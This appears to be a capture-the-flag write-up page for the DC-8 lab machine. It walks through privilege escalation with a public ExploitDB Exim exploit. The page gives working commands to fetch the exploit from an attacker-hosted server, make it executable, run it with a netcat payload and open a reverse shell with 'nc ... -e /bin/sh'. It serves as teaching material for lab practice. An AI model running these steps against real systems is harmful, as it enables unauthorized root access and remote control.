<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5. Privilege Escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>5. Privilege Escalation</u></b></h1><br />Look for an exploit on “ExploitDB”.<br /><br />a) Go to <a href="https://www.exploit-db.com/.">https://www.exploit-db.com/.</a><br /><br />b) Search “exim”.<br /><br /><img src="images/353-1.png" alt="images/353-1.png" /><br /><br /><img src="images/353-2.png" alt="images/353-2.png" /><br /><br />c) Download the exploit and copy it to “home”.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$wget</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>raw<span style="color:#ff9d00;font-weight:700">/</span>46996&nbsp;-O&nbsp;exploit.sh</div></div><br /><br />d) Create a Server on your Kali Machine.<br /><br />To do that I used Python to start the SimpleHTTPServer on port 80.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$python</span>&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;80</div></div><br /><br /><br />d) Go to “tmp” direstory and run the following commands.<br /><br /><div class="codebox"><div class="codebox">www-data@dc-8<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>192.168.12.56<span style="color:#ff9d00;font-weight:700">/</span>exploit.sh<br /><span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;777&nbsp;exploit.sh</div></div><br /><br />After downloading the exploit, I changed the exploit file permission to 777, using the chmod command to provide executable permission to the exploit. <br /><br />e) On the Kali Machine open a “netcat” session.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$nc</span>&nbsp;-lvp&nbsp;4444</div></div><br />f)  Run the command with the option to invoke “netcat”.<br /><br />On the victim machine, the exploit was executed with the -m switch to use the netcat payload as per the description on the exploit-db website.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$bash</span>&nbsp;exploit.sh&nbsp;-m&nbsp;netcat</div></div><br /><br /><br />NOTICE<br /><br />If you get the following error when running the above command:<br /><br /><span style="background-color:#000000;">$'\r': command not found</span><br /><br />Remove trailing “/r”character that causes this error with the command:<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$sed</span>&nbsp;-i&nbsp;<span style="color:#3ad900;font-weight:400">'s/\r$//'</span>&nbsp;exploit.sh</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/353-3.png" alt="images/353-3.png" /><br /><br />g) Use the “nc” command to provide the reverse shell to the attacker machine.<br /><br />When you got:<br /><br /><span style="background-color:#000000;">Waiting 5 seconds...<br />localhost [127.0.0.1] 31337 (?) open</span><br /><br />Run the following command.<br /><br /><div class="codebox"><div class="codebox">nc&nbsp;192.168.12.56&nbsp;4444&nbsp;-e&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span></div></div><br /><br />On your Kali Machine you'll have a “reverse shell”.<br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/353-4.png" alt="images/353-4.png" /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>